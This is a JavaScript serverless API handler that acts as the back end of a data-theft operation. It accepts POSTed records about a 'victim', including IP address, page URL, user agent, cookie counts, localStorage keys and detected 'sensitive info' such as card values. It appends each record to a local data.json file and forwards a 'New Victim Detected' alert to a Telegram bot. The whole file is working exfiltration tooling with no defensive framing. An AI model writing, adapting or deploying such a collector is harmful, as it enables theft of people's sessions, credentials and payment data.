// Use ES Module imports for consistency with 'export default'
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

// Get __dirname equivalent for ES Modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Telegram Config
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendToTelegram(data) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.warn("Telegram config missing");
        return;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // Format Message
    let msg = `🔓 *New Victim Detected*\n\n`;
    msg += `🆔 *IP:* \`${data.ip || 'Unknown'}\`\n`;
    msg += `🌐 *URL:* ${data.url || 'N/A'}\n`;
    
    // Safe UA handling
    const ua = data.userAgent ? data.userAgent.substring(0, 50) : 'N/A';
    msg += `🖥️ *UA:* \`${ua}...\`\n`;
    
    if (data.sensitiveInfo && Array.isArray(data.sensitiveInfo) && data.sensitiveInfo.length > 0) {
        msg += `\n💳 *Sensitive Info Found:*\n`;
        data.sensitiveInfo.forEach(item => {
            msg += `• ${item.type}: \`${item.value}\`\n`;
        });
    } else {
        msg += `\n💳 *Sensitive Info:* None detected.`;
    }

    const cookieCount = data.cookies ? data.cookies.split(';').filter(c => c.trim()).length : 0;
    msg += `\n🍪 *Cookies:* ${cookieCount} found`;
    
    const storageKeys = Object.keys(data.storage?.localStorage || {}).join(', ');
    msg += `\n💾 *Local Storage Keys:* ${storageKeys || 'None'}`;

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        })
    }).catch(err => console.error("Telegram Error:", err));
}

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    try {
        const data = req.body;
        
        // Save to local JSON file using __dirname for reliability
        const filePath = path.join(__dirname, '..', 'data.json'); // Go up one dir from api/ to root
        
        let existingData = [];
        if (fs.existsSync(filePath)) {
            try { 
                const content = fs.readFileSync(filePath, 'utf8');
                existingData = JSON.parse(content);
            } catch (e) { 
                console.error("Error reading data.json", e);
            }
        }
        
        // Ensure existingData is an array before pushing
        if (!Array.isArray(existingData)) existingData = [];
        
        existingData.push(data);
        fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));

        // Send to Telegram
        sendToTelegram(data);

        res.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error("Handler Error:", error);
        res.status(500).json({ error: error.message });
    }
}
